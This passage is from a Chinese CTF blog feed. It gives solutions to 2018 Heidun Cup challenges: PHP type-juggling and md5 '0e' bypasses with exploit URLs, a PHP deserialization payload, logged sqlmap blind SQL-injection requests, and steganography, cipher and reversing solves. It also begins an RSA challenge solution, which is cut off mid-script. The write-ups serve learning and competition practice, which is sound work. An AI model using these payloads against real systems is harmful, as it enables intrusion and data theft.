class="comment">//var_dump(array_search('XIPU', array("0","1",0)));//int(2)</span></span><br><span class="line">        <span class="comment">//0==‘XIPU’为真，搜索到0值的下标为2</span></span><br><span class="line">        $p===<span class="keyword">false</span>?<span class="keyword">die</span>(<span class="string">"ha?"</span>):<span class="keyword">NULL</span>; </span><br><span class="line">        <span class="keyword">foreach</span>($x2[<span class="string">"x22"</span>] <span class="keyword">as</span> $key=&gt;$val)&#123; </span><br><span class="line">            $val===<span class="string">"XIPU"</span>?<span class="keyword">die</span>(<span class="string">"ha?"</span>):<span class="keyword">NULL</span>; </span><br><span class="line">        &#125; </span><br><span class="line">        $c=<span class="number">1</span>; </span><br><span class="line">&#125; </span><br><span class="line">&#125; </span><br><span class="line">$x3 = $_GET[<span class="string">'x3'</span>]; </span><br><span class="line"><span class="keyword">if</span> ($x3 != <span class="string">'15562'</span>) &#123; </span><br><span class="line">    <span class="keyword">if</span> (strstr($x3, <span class="string">'XIPU'</span>)) &#123; </span><br><span class="line">        <span class="keyword">if</span> (substr(md5($x3),<span class="number">8</span>,<span class="number">16</span>) == substr(md5(<span class="string">'15562'</span>),<span class="number">8</span>,<span class="number">16</span>)) &#123; </span><br><span class="line">            <span class="comment">//两个符合正则  /0e\d+/  的字符串弱相等。</span></span><br><span class="line">            <span class="comment">// 爆破见下方python代码</span></span><br><span class="line">            $d=<span class="number">1</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">if</span>($a &amp;&amp; $b &amp;&amp; $c &amp;&amp; $d)&#123; </span><br><span class="line">    <span class="keyword">include</span> <span class="string">"flag.php"</span>; </span><br><span class="line">    <span class="keyword">echo</span> $flag; </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">brute</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> range(<span class="number">0x20</span>, <span class="number">0x7f</span>):</span><br><span class="line">        <span class="keyword">for</span> b <span class="keyword">in</span> range(<span class="number">0x20</span>, <span class="number">0x7f</span>):</span><br><span class="line">            <span class="keyword">for</span> c <span class="keyword">in</span> range(<span class="number">0x20</span>, <span class="number">0x7f</span>):</span><br><span class="line">                    x = chr(a) + chr(b) + chr(c)+s</span><br><span class="line">                    mm=md5(x.encode(<span class="string">'UTF-8'</span>)).hexdigest()</span><br><span class="line">                    flag=<span class="number">1</span></span><br><span class="line">                    <span class="keyword">for</span> i <span class="keyword">in</span> mm[<span class="number">10</span>:<span class="number">24</span>]:</span><br><span class="line">                        <span class="keyword">if</span> i <span class="keyword">not</span> <span class="keyword">in</span> <span class="string">'0123456789'</span>:</span><br><span class="line">                            flag=<span class="number">0</span></span><br><span class="line">                            <span class="keyword">break</span></span><br><span class="line">                    <span class="keyword">if</span> flag <span class="keyword">and</span> mm[<span class="number">8</span>:<span class="number">10</span>]==<span class="string">'0e'</span>:</span><br><span class="line">                        print(x)</span><br><span class="line"></span><br><span class="line">brute()</span><br><span class="line"><span class="comment"># kN[XIPU</span></span><br><span class="line"><span class="comment"># v=|XIPU</span></span><br><span class="line"><span class="comment"># y'wXIPU</span></span><br><span class="line"><span class="comment"># &#125;MOXIPU</span></span><br><span class="line"><span class="comment"># ~VhXIPU</span></span><br><span class="line"><span class="comment">## http://192.168.200.200/web/bestlanguage/?x1=0&amp;x2=&#123;%22x21%22:%222018hello%22,%22x22%22:[[],0]&#125;&amp;x3=~VhXIPU</span></span><br><span class="line"><span class="comment">## flag&#123;510ea2879fa29d0d618b1f55350965c3&#125;</span></span><br></pre></td></tr></table></figure><h1 id="the-user-is-admin"><a href="#the-user-is-admin" class="headerlink" title="the user is admin"></a>the user is admin</h1><p>和 bugku 平台某个题目原理相似，因此没有保留源码。可以参考 <a href="https://findneo.github.io/180406BugkuWriteup/#welcome-to-bugkuctf">该题</a> ，不赘述。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/web/theuserisadmin/?file=class.php&amp;user=php://input&amp;pass=O:4:"Read":1:&#123;s:4:"file";s:8:"f1a9.php";&#125;</span><br><span class="line"></span><br><span class="line">post:the user is admin</span><br><span class="line">    </span><br><span class="line"><span class="comment">//flag&#123;078d8dd8023d5716a11780adf344dfd2&#125;</span></span><br></pre></td></tr></table></figure><h1 id="ccgs"><a href="#ccgs" class="headerlink" title="ccgs"></a>ccgs</h1><p><img src="1537109403700.png" alt="1537109403700"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">binwalk -e sgcc.png</span><br><span class="line">cat secret.txt | base64 -d | base64 -d &gt; final.png</span><br></pre></td></tr></table></figure><p><img src="1537070199581.png" alt="1537070199581"></p><h1 id="注入日志分析"><a href="#注入日志分析" class="headerlink" title="注入日志分析"></a>注入日志分析</h1><p>给了一个日志文件，<code>file data.log</code>得到是一个文本文件，直接打开，前几行是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#Software: Microsoft Internet Information Services 6.0</span><br><span class="line">#Version: 1.0</span><br><span class="line">#Date: 2015-10-21 09:16:34</span><br></pre></td></tr></table></figure><p>猜测是IIS服务器记录的流量日志， 分析前几行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">2015-10-21 09:16:34 W3SVC1 192.168.1.135 GET /index.htm - 80 - 192.168.1.101 Mozilla/5.0+(Macintosh;+Intel+Mac+OS+X+10.10;+rv:41.0)+Gecko/20100101+Firefox/41.0 200 0 0</span><br><span class="line">2015-10-21 09:16:34 W3SVC1 192.168.1.135 GET /favicon.ico - 80 - 192.168.1.101 Mozilla/5.0+(Macintosh;+Intel+Mac+OS+X+10.10;+rv:41.0)+Gecko/20100101+Firefox/41.0 404 0 2</span><br><span class="line">2015-10-21 09:16:36 W3SVC1 192.168.1.135 GET /show.asp id=2 80 - 192.168.1.101 Mozilla/5.0+(Macintosh;+Intel+Mac+OS+X+10.10;+rv:41.0)+Gecko/20100101+Firefox/41.0 200 0 0</span><br><span class="line">2015-10-21 09:25:01 W3SVC1 192.168.1.135 GET /show.asp id=2%27|17|80040e14|字符串_&apos;&apos;_之前有未闭合的引号。 80 - 192.168.1.101 Mozilla/5.0+(Macintosh;+Intel+Mac+OS+X+10.10;+rv:41.0)+Gecko/20100101+Firefox/41.0 500 0 0</span><br></pre></td></tr></table></figure><p>可以看到就是一条条的HTTP请求，并且后面跟着状态码。继续浏览，看到<code>id</code>字段出现一些<code>SQL</code>的关键字，那么可以想到这记录的就是<code>sqlmap</code>(或许)的注入流量分析。思路就是找到关键的注入请求，文件很大，我们可以搜索<code>flag</code>试试，找到关键的请求如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">2015-10-21 09:32:35 W3SVC1 192.168.1.135 GET /show.asp id=2%20AND%20UNICODE%28SUBSTRING%28%28SELECT%20ISNULL%28CAST%28LTRIM%28STR%28COUNT%28DISTINCT%28theflag%29%29%29%29%20AS%20NVARCHAR%284000%29%29%2CCHAR%2832%29%29%20FROM%20tourdata.dbo.news%29%2C1%2C1%29%29%3E51|18|800a0bcd|BOF_或_EOF_中有一个是“真”，或者当前的记录已被删除，所需的操作要求一个当前的记录。 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 500 0 0</span><br><span class="line">2015-10-21 09:32:35 W3SVC1 192.168.1.135 GET /show.asp id=2%20AND%20UNICODE%28SUBSTRING%28%28SELECT%20ISNULL%28CAST%28LTRIM%28STR%28COUNT%28DISTINCT%28theflag%29%29%29%29%20AS%20NVARCHAR%284000%29%29%2CCHAR%2832%29%29%20FROM%20tourdata.dbo.news%29%2C1%2C1%29%29%3E48 80 - 192.168.1.101 Mozilla/5.0+(Windows;+U;+Windows+NT+6.0;+en-US;+rv:1.9.1b4)+Gecko/20090423+Firefox/3.5b4+GTB5+(.NET+CLR+3.5.30729) 200 0 0</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>可以利用文本编辑器如<code>sublime text 3</code>的<code>ctrl+H</code>的替换功能， 将关键流量进行精简并<code>urldecode</code>利于分析(截取两个代表性请求)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id=2 AND UNICODE(SUBSTRING((SELECT ISNULL(CAST(LTRIM(STR(COUNT(DISTINCT(theflag)))) AS NVARCHAR(4000)),CHAR(32)) FROM tourdata.dbo.news),1,1))&gt;51|18|800a0bcd|BOF_或_EOF_中有一个是“真”，或者当前的记录已被删除，所需的操作要求一个当前的记录。 500 0 0</span><br><span class="line">id=2 AND UNICODE(SUBSTRING((SELECT ISNULL(CAST(LTRIM(STR(COUNT(DISTINCT(theflag)))) AS NVARCHAR(4000)),CHAR(32)) FROM tourdata.dbo.news),1,1))&gt;48 80 200 0 0</span><br></pre></td></tr></table></figure><p>可以看到这里是二分法盲注的HTTP请求，现在思路很明确了， 从<code>SUBSTRING(.*, 1, 1)</code>开始找，并且只要看最后几条的注入请求就可以判断出字符是多少。 比如<code>SUBSTRING(.*, 1, 1) &gt; 48</code>的状态码是<code>200</code>，<code>SUBSTRING(.*, 1, 1) &gt; 49</code>的状态码是<code>500</code>，那其实就可以确定字符的ascii码是49。就这样就能得到<code>theflag</code>的值。</p><h1 id="brightstar"><a href="#brightstar" class="headerlink" title="brightstar"></a>brightstar</h1><p><a href="https://ctf-wiki.github.io/ctf-wiki/crypto/classical/others/#_9" target="_blank" rel="noopener">列移位密码</a> </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">snkeegt fhstetr Iedsabs tnaktrt otessha iiriwis tethees</span><br><span class="line">key： howarey</span><br><span class="line">Columnar Transposition Cipher</span><br></pre></td></tr></table></figure><table><thead><tr><th>h</th><th>o</th><th>w</th><th>a</th><th>r</th><th>e</th><th>y</th></tr></thead><tbody><tr><td>3</td><td>4</td><td>6</td><td>1</td><td>5</td><td>2</td><td>7</td></tr><tr><td>I</td><td>t</td><td>i</td><td>s</td><td>o</td><td>f</td><td>t</td></tr><tr><td>e</td><td>n</td><td>i</td><td>n</td><td>t</td><td>h</td><td>e</td></tr><tr><td>d</td><td>a</td><td>r</td><td>k</td><td>e</td><td>s</td><td>t</td></tr><tr><td>s</td><td>k</td><td>i</td><td>e</td><td>s</td><td>t</td><td>h</td></tr><tr><td>a</td><td>t</td><td>w</td><td>e</td><td>s</td><td>e</td><td>e</td></tr><tr><td>b</td><td>r</td><td>i</td><td>g</td><td>h</td><td>t</td><td>e</td></tr><tr><td>s</td><td>t</td><td>s</td><td>t</td><td>a</td><td>r</td><td>s</td></tr></tbody></table><p>或者</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="string">'snkeegt fhstetr Iedsabs tnaktrt otessha iiriwis tethees'</span>.split(<span class="string">' '</span>)</span><br><span class="line">k=<span class="string">'howarey'</span></span><br><span class="line">kk=sorted(k)</span><br><span class="line">print(<span class="string">''</span>.join(c[kk.index(j)][i] <span class="keyword">for</span> i <span class="keyword">in</span> range(len(k)) <span class="keyword">for</span> j <span class="keyword">in</span> k))</span><br><span class="line"><span class="comment"># Itisofteninthedarkestskiesthatweseebrighteststars</span></span><br></pre></td></tr></table></figure><h1 id="这是啥呀"><a href="#这是啥呀" class="headerlink" title="这是啥呀"></a>这是啥呀</h1><p>base32编码</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo MZWGCZ33MM4GENJVHBRDSNJUGAYTSOBVGZTDAYRQGIZTINLEMMZTSNJVHBRX2=== | base32 -d</span><br><span class="line"><span class="meta">#</span><span class="bash">flag&#123;c8b558b954019856f0b02345dc39558c&#125;</span></span><br></pre></td></tr></table></figure><h1 id="Windows逆向"><a href="#Windows逆向" class="headerlink" title="Windows逆向"></a>Windows逆向</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">s=&apos;sKfxEeft&#125;f&#123;gyrYgthtyhifsjei53UUrrr_t2cdsef66246087138\0087138&apos;</span><br><span class="line">flag=&apos;&apos;</span><br><span class="line">idx=[1,4,14,10,5,36,23,42,13,19,28,13,27,39,48,41,42]</span><br><span class="line">for i in idx:</span><br><span class="line">     flag+=s[i]</span><br><span class="line">print(flag)</span><br><span class="line"># KEY&#123;e2s6ry3r5s8f6</span><br></pre></td></tr></table></figure><p>得到部分flag，加上1024}得到完整flag：KEY{e2s6ry3r5s8f61024}</p><h1 id="reverseme"><a href="#reverseme" class="headerlink" title="reverseme"></a>reverseme</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">"open('file.png','wb').write(open('reverseme','rb').read()[::-1])"</span></span><br><span class="line">或</span><br><span class="line">&lt;reverseme xxd -p -c1 | tac | xxd -p -r &gt;file.png</span><br></pre></td></tr></table></figure><p><img src="1537420090085.png" alt="1537420090085"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">convert -flop file.png mirror_file.png</span><br></pre></td></tr></table></figure><p><img src="1537420103233.png" alt="1537420103233"></p><h1 id="下午"><a href="#下午" class="headerlink" title="下午"></a>下午</h1><p><a href="https://github.com/Tuhinshubhra/CMSeeK" target="_blank" rel="noopener">CMSeeK</a> 扫出配置文件 <a href="http://192.168.200.202//configuration.php.txt" target="_blank" rel="noopener">http://192.168.200.202//configuration.php.txt</a> </p><p>底部有flag: <code>flag{0b58f603ff55c0c190502b44b4ffbf2c}</code>  </p><p>此外一些没进一步利用上的信息和部分题目的附件放在<a href="https://github.com/findneo/ctfgodown/blob/master/20180916heidun/" target="_blank" rel="noopener">GiIthub</a> ，有兴趣可移步查看。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;2018/9/16  福师大黑盾杯&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;1541605429359.png&quot; alt=&quot;1541605429359&quot;&gt;&lt;/p&gt;
&lt;h1 id=&quot;信息泄露-代码审计&quot;&gt;&lt;a href=&quot;#信息泄露-代码审计&quot; class=&quot;headerlink&quot;
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>胖哈勃之 LHY</title>
    <link href="https://findneo.github.io/180903-pwnhub-lhy/"/>
    <id>https://findneo.github.io/180903-pwnhub-lhy/</id>
    <published>2018-09-02T18:29:11.000Z</published>
    <updated>2019-01-25T23:21:37.075Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Problem"><a href="#Problem" class="headerlink" title="Problem"></a>Problem</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> gmpy</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> x, y, flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> gmpy.is_prime(y) ** <span class="number">2016</span> + gmpy.is_prime(x+<span class="number">1</span>) ** <span class="number">2017</span> + ((x**<span class="number">2</span> - <span class="number">1</span>)**<span class="number">2</span> % (<span class="number">2</span>*x*y - <span class="number">1</span>) + <span class="number">2</span>) ** <span class="number">2018</span> == <span class="number">30097557298197417800049182668952226601954645169633891463401117760245367082644152355564014438095421962150109895432272944128252155287648477680131934943095113263121691874508742328500559321036238322775864636883202538152031804102118831278605474474352011895348919417742923873371980983336517409056008233804190890418285814476821890492630167665485823056526646050928460488168341721716361299816947722947465808004305806687049198633489997459201469227952552870291934919760829984421958853221330987033580524592596407485826446284220272614663464267135596497185086055090126893989371261962903295313304735911034185619611156742146</span></span><br><span class="line"></span><br><span class="line">p = gmpy.next_prime(x**<span class="number">3</span> + y**<span class="number">3</span>) <span class="comment">#(x+y)**3-3xy(x+y)</span></span><br><span class="line">q = gmpy.next_prime(x**<span class="number">2</span>*y + y**<span class="number">2</span>*x) <span class="comment">#xy(x+y)</span></span><br><span class="line">n = p * q</span><br><span class="line">phi = (p<span class="number">-1</span>)*(q<span class="number">-1</span>)</span><br><span class="line">d = gmpy.invert(<span class="number">0x10001</span>, phi)</span><br><span class="line">enc = pow(bytes_to_long(flag), <span class="number">0x10001</span>, n)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'n ='</span>, n</span><br><span class="line"><span class="keyword">print</span> <span class="string">'enc ='</span>, enc</span><br><span class="line"></span><br><span class="line"><span class="comment"># n = 260272753019642842691231717156206014402348296256668058656902033827190888150939144319270903947159599144884859205368557385941127216969379550487700198771513118894125094678559478972591331182960004648132846372455712958337042783083099376871113795475285658106058675217077803768944674144803250791799957440111855021945690877200606577646234107957498370758707097662736662439460472126493593605957225541979181422479704018055731221681621886820626215670393536343427267329350730257979042198593215747542270975288047196483958369426727778580292311145109908665004662296440533724591193527886702374790526322791818523938910660223971454070731594803459613066617828657725704376475527288174777197739360634209448477565044519733575375490101670974499385760735451471034271880800081246883157088501597655371430353965493264345172541221268942926210055390568364981514774743693528424196241142665685211916330254113610598390909248626686397970038848966187547231199741</span></span><br><span class="line"><span class="comment"># enc = 73933313646416156737449236838459526871566017180178176765840447023088664788672323530940171469589918772272559607026808711216932468486201094786991159096267208480969757088208089800600731106685561375522764783335332964711981392251568543122418192877756299395774738176188452197889668610818741062203831272066261677731889616150485770623945568369493256759711422067551058418926344060504112146971937651406886327429318390247733970549845424064244469193626197360072341969574784310397213033860597822010667926563087858301337091484951760613299203587677078666096526093414014637559237148644939541419075479462431789925219269815364529507771308181435591670281081465439913711912925412078002618729159141400730636976744132429329651487292506365655834202469178066850282850374067239317928012461993443785247524500680257923687511378073703423047348824611101206633407452837948194591695712958510124436821151767823443033286425729473563002691262316964646014201612</span></span><br></pre></td></tr></table></figure><h1 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h1><p>由于</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>+<span class="number">1</span>+<span class="number">2</span>**<span class="number">2018</span> == <span class="number">30097557298197417800049182668952226601954645169633891463401117760245367082644152355564014438095421962150109895432272944128252155287648477680131934943095113263121691874508742328500559321036238322775864636883202538152031804102118831278605474474352011895348919417742923873371980983336517409056008233804190890418285814476821890492630167665485823056526646050928460488168341721716361299816947722947465808004305806687049198633489997459201469227952552870291934919760829984421958853221330987033580524592596407485826446284220272614663464267135596497185086055090126893989371261962903295313304735911034185619611156742146</span></span><br></pre></td></tr></table></figure><p>所以 <code>x+1</code>和 <code>y</code> 都是质数，<code>(x**2 - 1)**2 % (2*x*y - 1)==0</code> 。</p><p>根据数学推理或者大胆瞎猜得到 <code>x=2y</code> ，然后代入生成p和q，以<code>pq==n</code> 为条件爆破y即可。</p><p>来自 <a href="https://mp.weixin.qq.com/s/3qvuVd9tBK3J-Q9vBMGxwA" target="_blank" rel="noopener">官方WP</a> 的解题脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Show that if 4ab - 1 divides (4a**2 - 1)**2, then a = b.</span></span><br><span class="line"><span class="comment"># suppose y be a large prime and x + 1 is another large prime.</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> gmpy</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># from this condition with help of previous fact we can deduce that:</span></span><br><span class="line"><span class="comment"># ==&gt; we take 2a = x and b = y, so: 2xy - 1 | (x**2 - 1)**2 ==&gt; x = 2y</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># assert gmpy.is_prime(y) + gmpy.is_prime(x+1) + ((x**2 - 1)**2 % (2*x*y - 1) + 2) ** 2018 == 30097557298197417800049182668952226601954645169633891463401117760245367082644152355564014438095421962150109895432272944128252155287648477680131934943095113263121691874508742328500559321036238322775864636883202538152031804102118831278605474474352011895348919417742923873371980983336517409056008233804190890418285814476821890492630167665485823056526646050928460488168341721716361299816947722947465808004305806687049198633489997459201469227952552870291934919760829984421958853221330987033580524592596407485826446284220272614663464267135596497185086055090126893989371261962903295313304735911034185619611156742146 = 1 + 1 + 2 ** 2018</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># so we have x = 2y</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = gmpy.next_prime(x**3 + y**3) # ==&gt; p = gmpy.next_prime(8*y**3 + y**3) = gmpy.next_prime(9*y**3)</span></span><br><span class="line"><span class="comment"># q = gmpy.next_prime(x**2*y + y**2*x) # ==&gt; q = gmpy.next_prime(4*y**2*y + y**2*(2y)) = gmpy.next_prime(6*y**3)</span></span><br><span class="line"><span class="comment"># n = p * q # ==&gt; n = p * q ~= (9*y**3) * (6*y**3) = 54*y**6</span></span><br><span class="line"><span class="comment"># So we can factor n with knowing n ~= 54*y**6</span></span><br><span class="line"></span><br><span class="line">n = <span class="number">260272753019642842691231717156206014402348296256668058656902033827190888150939144319270903947159599144884859205368557385941127216969379550487700198771513118894125094678559478972591331182960004648132846372455712958337042783083099376871113795475285658106058675217077803768944674144803250791799957440111855021945690877200606577646234107957498370758707097662736662439460472126493593605957225541979181422479704018055731221681621886820626215670393536343427267329350730257979042198593215747542270975288047196483958369426727778580292311145109908665004662296440533724591193527886702374790526322791818523938910660223971454070731594803459613066617828657725704376475527288174777197739360634209448477565044519733575375490101670974499385760735451471034271880800081246883157088501597655371430353965493264345172541221268942926210055390568364981514774743693528424196241142665685211916330254113610598390909248626686397970038848966187547231199741</span></span><br><span class="line">enc = <span class="number">73933313646416156737449236838459526871566017180178176765840447023088664788672323530940171469589918772272559607026808711216932468486201094786991159096267208480969757088208089800600731106685561375522764783335332964711981392251568543122418192877756299395774738176188452197889668610818741062203831272066261677731889616150485770623945568369493256759711422067551058418926344060504112146971937651406886327429318390247733970549845424064244469193626197360072341969574784310397213033860597822010667926563087858301337091484951760613299203587677078666096526093414014637559237148644939541419075479462431789925219269815364529507771308181435591670281081465439913711912925412078002618729159141400730636976744132429329651487292506365655834202469178066850282850374067239317928012461993443785247524500680257923687511378073703423047348824611101206633407452837948194591695712958510124436821151767823443033286425729473563002691262316964646014201612</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># now we calculate the 5th root of n//45 to find the y:</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">iroot</span><span class="params">(k, n)</span>:</span></span><br><span class="line">   UB = <span class="number">1</span></span><br><span class="line">   <span class="keyword">while</span> pow(UB, k) &lt; n:</span><br><span class="line">       UB *= <span class="number">2</span></span><br><span class="line">   LB = UB / <span class="number">2</span></span><br><span class="line">   <span class="keyword">while</span> UB - LB &gt; <span class="number">1</span>:</span><br><span class="line">       M = (LB + UB) // <span class="number">2</span></span><br><span class="line">       midToK = pow(M, k)</span><br><span class="line">       <span class="keyword">if</span> midToK &lt; n:</span><br><span class="line">           LB = M</span><br><span class="line">       <span class="keyword">elif</span> n &lt; midToK:</span><br><span class="line">           UB = M</span><br><span class="line">       <span class="keyword">else</span>:</span><br><span class="line">           <span class="keyword">return</span> M</span><br><span class="line">   <span class="keyword">if</span> pow(UB, k) == n:</span><br><span class="line">       <span class="keyword">return</span> UB</span><br><span class="line">   <span class="keyword">else</span>:</span><br><span class="line">       <span class="keyword">return</span> LB</span><br><span class="line"></span><br><span class="line">y = iroot(<span class="number">6</span>, n // <span class="number">54</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">   <span class="keyword">if</span> gmpy.is_prime(y):</span><br><span class="line">       <span class="keyword">if</span> gmpy.next_prime(<span class="number">9</span>*y**<span class="number">3</span>) * gmpy.next_prime(<span class="number">6</span>*y**<span class="number">3</span>) == n:</span><br><span class="line">           <span class="keyword">print</span> <span class="string">'Found:'</span>, <span class="string">'y ='</span>, y</span><br><span class="line">           <span class="keyword">break</span></span><br><span class="line">   <span class="keyword">else</span>:</span><br><span class="line">       y += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">x = <span class="number">2</span>*y</span><br><span class="line">p = gmpy.next_prime(x**<span class="number">3</span> + y**<span class="number">3</span>)</span><br><span class="line">q = gmpy.next_prime(x**<span class="number">2</span>*y + y**<span class="number">2</span>*x)</span><br><span class="line">n = p * q</span><br><span class="line">phi = (p<span class="number">-1</span>)*(q<span class="number">-1</span>)</span><br><span class="line">d = gmpy.invert(<span class="number">0x10001</span>, phi)</span><br><span class="line">flag = long_to_bytes(pow(enc, d, n))</span><br><span class="line"><span class="keyword">print</span> <span class="string">'flag ='</span>, flag</span><br></pre></td></tr></table></figure><p>没有gmpy库，稍微改了下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">n = <span class="number">260272753019642842691231717156206014402348296256668058656902033827190888150939144319270903947159599144884859205368557385941127216969379550487700198771513118894125094678559478972591331182960004648132846372455712958337042783083099376871113795475285658106058675217077803768944674144803250791799957440111855021945690877200606577646234107957498370758707097662736662439460472126493593605957225541979181422479704018055731221681621886820626215670393536343427267329350730257979042198593215747542270975288047196483958369426727778580292311145109908665004662296440533724591193527886702374790526322791818523938910660223971454070731594803459613066617828657725704376475527288174777197739360634209448477565044519733575375490101670974499385760735451471034271880800081246883157088501597655371430353965493264345172541221268942926210055390568364981514774743693528424196241142665685211916330254113610598390909248626686397970038848966187547231199741</span></span><br><span 